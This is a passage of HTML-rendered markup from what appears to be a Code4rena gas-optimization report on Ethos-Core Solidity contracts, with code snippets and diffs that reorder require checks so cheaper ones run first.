class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         require(_MCRs.length == _collaterals.length, &quot;Array lengths must match&quot;);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         require(_CCRs.length == _collaterals.length, &quot;Array lenghts must match&quot;);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        require(!initialized, &quot;Can only initialize once&quot;);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         for(uint256 i = 0; i &lt; _collaterals.length; i++) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">             address collateral = _collaterals[i];</span></span></span></code></pre>\n<h3 id=\"cheaper-to-check-function-argument-against-a-constant-as-compared-to-checking-it-against-a-storaga-variable\" style=\"position:relative;\"><a href=\"#cheaper-to-check-function-argument-against-a-constant-as-compared-to-checking-it-against-a-storaga-variable\" aria-label=\"cheaper to check function argument against a constant as compared to checking it against a storaga variable permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Cheaper to check function argument against a constant as compared to checking it against a storaga variable</h3>\n<p><a href=\"https://github.com/code-423n4/2023-02-ethos/blob/73687f32b934c9d697b97745356cdf8a1f264955/Ethos-Core/contracts/CollateralConfig.sol#L85-L100\">https://github.com/code-423n4/2023-02-ethos/blob/73687f32b934c9d697b97745356cdf8a1f264955/Ethos-Core/contracts/CollateralConfig.sol#L85-L100</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"96\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: /</span><span class=\"mtk12\">Ethos</span><span class=\"mtk1\">-</span><span class=\"mtk12\">Core</span><span class=\"mtk1\">/</span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">CollateralConfig</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">85</span><span class=\"mtk1\">:    </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">updateCollateralRatios</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">86:        </span><span class=\"mtk10\">address</span><span class=\"mtk1\"> </span><span class=\"mtk10\">_collateral</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">87:        </span><span class=\"mtk10\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk10\">_MCR</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">88:        </span><span class=\"mtk10\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk10\">_CCR</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">89</span><span class=\"mtk1\">:    ) </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> </span><span class=\"mtk11\">onlyOwner</span><span class=\"mtk1\"> </span><span class=\"mtk11\">checkCollateral</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_collateral</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">90</span><span class=\"mtk1\">:        </span><span class=\"mtk12\">Config</span><span class=\"mtk1\"> </span><span class=\"mtk12\">storage</span><span class=\"mtk1\"> </span><span class=\"mtk12\">config</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">collateralConfig</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_collateral</span><span class=\"mtk1\">];</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">91</span><span class=\"mtk1\">:        </span><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_MCR</span><span class=\"mtk1\"> &lt;= </span><span class=\"mtk12\">config</span><span class=\"mtk1\">.</span><span class=\"mtk12\">MCR</span><span class=\"mtk1\">, </span><span class=\"mtk8\">&quot;Can only walk down the MCR&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">92</span><span class=\"mtk1\">:        </span><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_CCR</span><span class=\"mtk1\"> &lt;= </span><span class=\"mtk12\">config</span><span class=\"mtk1\">.</span><span class=\"mtk12\">CCR</span><span class=\"mtk1\">, </span><span class=\"mtk8\">&quot;Can only walk down the CCR&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">94</span><span class=\"mtk1\">:        </span><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_MCR</span><span class=\"mtk1\"> &gt;= </span><span class=\"mtk12\">MIN_ALLOWED_MCR</span><span class=\"mtk1\">, </span><span class=\"mtk8\">&quot;MCR below allowed minimum&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">95</span><span class=\"mtk1\">:        </span><span class=\"mtk12\">config</span><span class=\"mtk1\">.</span><span class=\"mtk12\">MCR</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">_MCR</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">96</span><span class=\"mtk1\">:</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">97</span><span class=\"mtk1\">:        </span><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_CCR</span><span class=\"mtk1\"> &gt;= </span><span class=\"mtk12\">MIN_ALLOWED_CCR</span><span class=\"mtk1\">, </span><span class=\"mtk8\">&quot;CCR below allowed minimum&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">98</span><span class=\"mtk1\">:        </span><span class=\"mtk12\">config</span><span class=\"mtk1\">.</span><span class=\"mtk12\">CCR</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">_CCR</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">99</span><span class=\"mtk1\">:        </span><span class=\"mtk12\">emit</span><span class=\"mtk1\"> </span><span class=\"mtk11\">CollateralRatiosUpdated</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_collateral</span><span class=\"mtk1\">, </span><span class=\"mtk12\">_MCR</span><span class=\"mtk1\">, </span><span class=\"mtk12\">_CCR</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">100</span><span class=\"mtk1\">:    }</span></span></span></code></pre>\n<p>In the above, we have two types of checks, one that involves comparing a function argument to a storage variable <code>config</code> and another that compares function argument to a constant. It’s obviously cheaper to read a constant as compared to the storage one, thus should have checks for constant come before the one for storage</p>\n<p>We can also save alot of gas if we revert before running the line <code>Config storage config = collateralConfig[_collateral];</code> as it involves an SSTORE</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"diff\" data-index=\"97\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">diff --git a/Ethos-Core/contracts/CollateralConfig.sol b/Ethos-Core/contracts/CollateralConfig.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">index d524f23..f71570d 100644</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">--- a/Ethos-Core/contracts/CollateralConfig.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">+++ b/Ethos-Core/contracts/CollateralConfig.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">@@ -87,15 +87,17 @@ contract CollateralConfig is ICollateralConfig, CheckContract, Ownable {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         uint256 _MCR,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         uint256 _CCR</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     ) external onlyOwner checkCollateral(_collateral) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        require(_MCR &gt;= MIN_ALLOWED_MCR, &quot;MCR below allowed minimum&quot;);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        require(_CCR &gt;= MIN_ALLOWED_CCR, &quot;CCR below allowed minimum&quot;);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         Config storage config = collateralConfig[_collateral];</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         require(_MCR &lt;= config.MCR, &quot;Can only walk down the MCR&quot;);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         require(_CCR &lt;= config.CCR, &quot;Can only walk down the CCR&quot;);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-        require(_MCR &gt;= MIN_ALLOWED_MCR, &quot;MCR below allowed minimum&quot;);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         config.MCR = _MCR;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-        require(_CCR &gt;= MIN_ALLOWED_CCR, &quot;CCR below allowed minimum&quot;);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         config.CCR = _CCR;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         emit CollateralRatiosUpdated(_collateral, _MCR, _CCR);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     }</span></span></span></code></pre>\n<h3 id=\"reorder-the-require-statements-to-have-the-cheaper-one-before-the-gas-consuming-one\" style=\"position:relative;\"><a href=\"#reorder-the-require-statements-to-have-the-cheaper-one-before-the-gas-consuming-one\" aria-label=\"reorder the require statements to have the cheaper one before the gas consuming one permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Reorder the require statements to have the cheaper one before the gas consuming one</h3>\n<p><a href=\"https://github.com/code-423n4/2023-02-ethos/blob/73687f32b934c9d697b97745356cdf8a1f264955/Ethos-Core/contracts/ActivePool.sol#L71-L94\">https://github.com/code-423n4/2023-02-ethos/blob/73687f32b934c9d697b97745356cdf8a1f264955/Ethos-Core/contracts/ActivePool.sol#L71-L94</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"98\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: /</span><span class=\"mtk12\">Ethos</span><span class=\"mtk1\">-</span><span class=\"mtk12\">Core</span><span class=\"mtk1\">/</span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">ActivePool</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">71</span><span class=\"mtk1\">:    </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">setAddresses</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">78:        </span><span class=\"mtk10\">address</span><span class=\"mtk1\"> </span><span class=\"mtk10\">_treasuryAddress</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">81:    )</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">82:        </span><span class=\"mtk11\">external</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">83:        </span><span class=\"mtk11\">onlyOwner</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">84:    {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">85</span><span class=\"mtk1\">:        </span><span class=\"mtk11\">require</span><span class=\"mtk1\">(!</span><span class=\"mtk12\">addressesSet</span><span class=\"mtk1\">, </span><span class=\"mtk8\">&quot;Can call setAddresses only once&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">87</span><span class=\"mtk1\">:        </span><span class=\"mtk11\">checkContract</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_collateralConfigAddress</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">88</span><span class=\"mtk1\">:        </span><span class=\"mtk11\">checkContract</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_borrowerOperationsAddress</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">89</span><span class=\"mtk1\">:        </span><span class=\"mtk11\">checkContract</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_troveManagerAddress</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">90</span><span class=\"mtk1\">:        </span><span class=\"mtk11\">checkContract</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_stabilityPoolAddress</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">91</span><span class=\"mtk1\">:        </span><span class=\"mtk11\">checkContract</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_defaultPoolAddress</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">92</span><span class=\"mtk1\">:        </span><span class=\"mtk11\">checkContract</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_collSurplusPoolAddress</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">93</span><span class=\"mtk1\">:        </span><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_treasuryAddress</span><span class=\"mtk1\"> != </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk7\">0</span><span class=\"mtk1\">), </span><span class=\"mtk8\">&quot;Treasury cannot be 0 address&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">94</span><span class=\"mtk1\">:        </span><span class=\"mtk11\">checkContract</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_lqtyStakingAddress</span><span class=\"mtk1\">);</span></span></span></code></pre>\n<p>The check on Line 93 would cause our function to revert and since it involves a check for a function parameter, it would be cheaper to have it come before any other operation. In this case we have another check that involves reading from storage which is expensive. Fail early and cheaply</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"diff\" data-index=\"99\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">diff --git a/Ethos-Core/contracts/ActivePool.sol b/Ethos-Core/contracts/ActivePool.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">index 753fcd0..a6903af 100644</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">--- a/Ethos-Core/contracts/ActivePool.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">+++ b/Ethos-Core/contracts/ActivePool.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">@@ -82,6 +82,8 @@ contract ActivePool is Ownable, CheckContract, IActivePool {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         external</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         onlyOwner</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        require(_treasuryAddress != address(0), &quot;Treasury cannot be 0 address&quot;);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         require(!addressesSet, &quot;Can call setAddresses only once&quot;);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         checkContract(_collateralConfigAddress);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">@@ -90,7 +92,6 @@ contract ActivePool is Ownable, CheckContract, IActivePool {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         checkContract(_stabilityPoolAddress);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         checkContract(_defaultPoolAddress);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         checkContract(_collSurplusPoolAddress);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-        require(_treasuryAddress != address(0), &quot;Treasury cannot be 0 address&quot;);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         checkContract(_lqtyStakingAddress);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         collateralConfigAddress = _collateralConfigAddress;</span></span></span></code></pre>\n<h3 id=\"reorder-the-checks-to-avoid-wasting-gas-checking-computing-external-functionality\" style=\"position:relative;\"><a href=\"#reorder-the-checks-to-avoid-wasting-gas-checking-computing-external-functionality\" aria-label=\"reorder the checks to avoid wasting gas checking computing external functionality permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Reorder the checks to avoid wasting gas checking computing external functionality</h3>\n<p><a href=\"https://github.com/code-423n4/2023-02-ethos/blob/73687f32b934c9d697b97745356cdf8a1f264955/Ethos-Core/contracts/ActivePool.sol#L125-L130\">https://github.com/code-423n4/2023-02-ethos/blob/73687f32b934c9d697b97745356cdf8a1f264955/Ethos-Core/contracts/ActivePool.sol#L125-L130</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"100\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: /</span><span class=\"mtk12\">Ethos</span><span class=\"mtk1\">-</span><span class=\"mtk12\">Core</span><span class=\"mtk1\">/</span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">ActivePool</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">125</span><span class=\"mtk1\">:    </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">setYieldingPercentage</span><span class=\"mtk1\">(</span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_collateral</span><span class=\"mtk1\">, </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_bps</span><span class=\"mtk1\">) </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> </span><span class=\"mtk11\">onlyOwner</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">126</span><span class=\"mtk1\">:        </span><span class=\"mtk11\">_requireValidCollateralAddress</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_collateral</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">127</span><span class=\"mtk1\">:        </span><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_bps</span><span class=\"mtk1\"> &lt;= </span><span class=\"mtk7\">10_000</span><span class=\"mtk1\">, </span><span class=\"mtk8\">&quot;Invalid BPS value&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">128</span><span class=\"mtk1\">:        </span><span class=\"mtk12\">yieldingPercentage</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_collateral</span><span class=\"mtk1\">] = </span><span class=\"mtk12\">_bps</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">129</span><span class=\"mtk1\">:        </span><span class=\"mtk12\">emit</span><span class=\"mtk1\"> </span><span class=\"mtk11\">YieldingPercentageUpdated</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_collateral</span><span class=\"mtk1\">, </span><span class=\"mtk12\">_bps</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">130</span><span class=\"mtk1\">:    }</span></span></span></code></pre>\n<p>If we end up reverting on the Line <code>require(_bps &#x3C;= 10_000, \"Invalid BPS value\");</code> we would end up wasting alot of gas on the line <code>_requireValidCollateralAddress(_collateral);</code> . The later is a function call and the function has the following implementation</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"101\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">_requireValidCollateralAddress</span><span class=\"mtk1\">(</span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_collateral</span><span class=\"mtk1\">) </span><span class=\"mtk11\">internal</span><span class=\"mtk1\"> </span><span class=\"mtk11\">view</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk11\">ICollateralConfig</span><span class=\"mtk1\">(</span><span class=\"mtk12\">collateralConfigAddress</span><span class=\"mtk1\">).</span><span class=\"mtk11\">isCollateralAllowed</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_collateral</span><span class=\"mtk1\">),</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk8\">&quot;Invalid collateral address&quot;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        );</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span></code></pre>\n<p>Note in the above function, the require statement involves an external function call which is pretty expensive.</p>\n<p>Recommend to implement the following changes so that incase of an early revert on the <code>function parameter check</code> we would not waste gas</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"diff\" data-index=\"102\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">diff --git a/Ethos-Core/contracts/ActivePool.sol b/Ethos-Core/contracts/ActivePool.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">index 753fcd0..d83ee3a 100644</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">--- a/Ethos-Core/contracts/ActivePool.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">+++ b/Ethos-Core/contracts/ActivePool.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">@@ -123,8 +123,8 @@ contract ActivePool is Ownable, CheckContract, IActivePool {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     function setYieldingPercentage(address _collateral, uint256 _bps) external onlyOwner {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+         require(_bps &lt;= 10_000, &quot;Invalid BPS value&quot;);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         _requireValidCollateralAddress(_collateral);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-        require(_bps &lt;= 10_000, &quot;Invalid BPS value&quot;);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         yieldingPercentage[_collateral] = _bps;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         emit YieldingPercentageUpdated(_collateral, _bps);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     }</span></span></span></code></pre>\n<h3 id=\"reorder-the-require-statement-to-have-the-cheaper-one-come-first\" style=\"position:relative;\"><a href=\"#reorder-the-require-statement-to-have-the-cheaper-one-come-first\" aria-label=\"reorder the require statement to have the cheaper one come first permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 